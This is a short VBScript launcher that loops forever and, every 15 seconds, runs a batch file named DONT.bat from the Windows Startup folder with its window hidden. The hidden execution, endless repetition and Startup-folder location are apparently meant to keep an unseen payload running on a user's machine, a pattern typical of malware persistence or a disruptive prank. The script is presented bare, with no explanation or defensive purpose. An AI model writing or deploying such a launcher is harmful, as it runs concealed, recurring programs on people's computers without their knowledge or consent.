Set WshShell = CreateObject("WScript.Shell")

Do
    WshShell.Run chr(34) & WshShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DONT.bat") & chr(34), 0, False
    WScript.Sleep 15000
Loop
